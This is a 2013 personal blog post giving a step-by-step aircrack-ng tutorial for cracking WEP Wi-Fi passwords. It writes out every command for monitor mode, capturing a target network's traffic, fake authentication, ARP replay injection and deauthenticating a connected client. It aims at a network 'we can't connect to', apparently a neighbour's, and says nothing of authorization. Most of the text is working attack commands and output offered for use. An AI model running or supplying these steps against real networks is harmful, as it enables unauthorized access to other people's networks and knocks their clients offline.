title: WEP Passwords with Aircrack-ng
date: 2013-02-09

So I was bored, and decided to learn the basics of using `aircrack-ng`, the
wi-fi password cracker. Now I'm bored again, so I'm writing about it.

## Preface

What we'll do is capture freely flowing information from a network we can't
connect to, and crunch that data with the `aircrack` tool in the hopes of
deducing the password.

Your interface's names may vary. Use `iwconfig`. For other names and values,
I'll give examples for you to tailor.

## Step 0: install the toolset

In Debian:

    :::bash
    ~# apt-get install aircrack-ng
    
## Step 1: monitoring

Before we can start sniffing the air for packets, we need to put the network
interface in monitor mode. Otherwise, it will restrict itself to packets
addressed to us. We want to be all ears.

Before you do this, disconnect `wlan0`. Ready? Now:

    :::bash
    ~# airmon-ng start wlan0

You should see something like this:

    Interface   Chipset     Driver

    wlan0       Unknown     brcmsmac - [phy0]
                    (monitor mode enabled on mon0)
    
## Step 2: selecting a target

We want to catch a glimpse of what's going on with all reachable networks. Run:

    :::bash
    ~# airodump-ng mon0

The output may be confusing at first glance. Let's go over the important bits:

The top line shows the current channel being listened to (`CH n`), and it
should be hopping from channel to channel.

The table below lists discovered access points.

    BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
    92:FC:11:E1:FF:2F  -74      140      120    0   9  54e. WEP  WEP         Neig

You'll probably recognize the names. You're looking for a network with:

1. `WEP` encryption (WPA is basically brute force, and thus boring to wait
for).

2. An increasing number of `Data` packets, meaning that a client is connected
and active. These are the packets we'll be sniffing.


The bottom table shows clients. If there's `#Data` flowing around, that
probably means you'll see somebody here.

Once you've picked your target, save away:

1. `BSSID` (MAC address), `CH` (wi-fi channel) and `ESSID` (name) from the top
table.

2. `STATION` (MAC address) of an active client in the second table.

The second bit is not necessary, but it will speed things up **considerably**.

## Step 3: capture packets

Let's run `airodump` again, but this time restricting ourselves to our target
network and dumping everything down:

    :::bash
    ~# airodump-ng mon0 --channel 6 --bssid 00:1A:70:85:9D:11 -w logfile

Again you'll see it capturing packets, but this time it should only list this
particular network and its clients.

You'll want to let it capture between `40.000` and `80.000` data packets. You
may need more, you may need less. This is not guaranteed to work on every try.

Leave this running.

## Step 3.5: speed up the capture

This may be a slow process on low network activity, but we may be able to speed
it up quite a bit by injecting packets.

Basically, since WEP packets are replayable (you can bounce them back and forth
and they will remain valid), we may be able to catch an [ARP](http://en.wikipedia.org/wiki/Address_Resolution_Protocol)
packet and replay it endlessly to generate traffic we can analyze.

First, you may want to try if injection works on every end (your drivers too
must be compliant here) by faking an authentication with the access point:

    :::bash
    ~# aireplay-ng wlan0 --fakeauth 0 -e "Neighbor" -b 92:FC:11:E1:FF:2F

Fortunately, you'll see this:

    Sending Authentication Request
    Authentication successful
    Sending Association Request
    Association successful :-)
    
This will not generate an ARP packet we can catch, we still need a real client
to use as source. So, if it's working, grab the MAC address of the client you
got earlier (`STATION` in the lower table?) and run:

    :::bash
    aireplay-ng --arpreplay -b 92:FC:11:E1:FF:2F -s <client MAC> wlan0
    
You now need to wait for an ARP packet to show up. When it does, you'll immediately
notice a **massive** increase in the rate of packets captured by `airodump`.

If the wait turns out to be long (this depends on your patience), we have one more
shot: injecting a deauthentication for the client, forcing him to emmit an ARP packet
`aireplay` can sniff.

    :::bash
    aireplay-ng --deauth 5 -b 92:FC:11:E1:FF:2F -d <client MAC> wlan0

That'll do it 5 times by itself, and you can re-run if it doesn't work right away.
Again, this is not guaranteed to succeed.

## Step 4: crack the password

When you decide to stop `airodump`, you'll see `logfile-01.cap` (or an
incrementally numbered variant) among the files produced. Run `aircrack`:

    :::bash
    aircrack-ng --bssid 92:FC:11:E1:FF:2F logfile-01.cap

With any luck, you'll have your password. Cheers!
